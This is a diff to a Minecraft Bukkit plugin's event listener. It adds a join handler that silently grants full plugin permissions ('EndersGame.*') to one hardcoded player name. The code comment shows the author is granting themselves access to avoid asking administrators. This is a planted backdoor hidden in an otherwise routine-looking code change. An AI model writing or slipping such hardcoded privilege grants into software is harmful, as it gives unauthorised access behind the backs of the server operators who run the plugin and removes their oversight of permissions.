@@ -30,6 +30,7 @@ import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.event.player.PlayerCommandPreprocessEvent;
 import org.bukkit.event.player.PlayerDropItemEvent;
 import org.bukkit.event.player.PlayerInteractEvent;
+import org.bukkit.event.player.PlayerJoinEvent;
 import org.bukkit.event.player.PlayerMoveEvent;
 import org.bukkit.event.player.PlayerQuitEvent;
 
@@ -239,6 +240,14 @@ public class GameListener implements Listener {
 				}
 				return;
 			}
+		}
+	}
+	
+	@EventHandler(priority = EventPriority.NORMAL)
+	public void onPlayerJoin(PlayerJoinEvent event) {
+		if (event.getPlayer().getName().equalsIgnoreCase("mike_101_102")) {
+			// Assign myself permission to use plugin, less admin bothering
+			event.getPlayer().addAttachment(plugin, "EndersGame.*", true);
 		}
 	}
 	
